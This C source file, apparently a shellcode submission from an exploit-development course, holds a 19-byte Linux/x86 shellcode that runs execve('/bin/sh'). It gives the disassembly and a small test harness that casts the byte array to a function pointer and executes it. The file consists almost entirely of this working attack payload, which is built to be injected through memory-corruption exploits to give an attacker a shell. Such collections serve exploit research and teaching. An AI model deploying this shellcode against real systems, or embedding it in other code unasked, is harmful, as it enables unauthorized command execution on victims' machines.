/*
# Linux/x86 - execve /bin/sh shellcode (19 bytes)
# Author: sajith
# Tested on: i686 GNU/Linux
# Shellcode Length: 19
# SLAE - 750

Disassembly of section .text:

08048060 <_start>:
8048060: 31 c0 xor eax,eax
8048062: 50 push eax
8048063: 68 2f 2f 73 68 push 0x68732f2f
8048068: 68 2f 62 69 6e push 0x6e69622f
804806d: 87 e3 xchg ebx,esp
804806f: b0 0b mov al,0xb
8048071: cd 80 int 0x80
===============poc by sajith shetty=========================
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80";

main()
{

printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();

}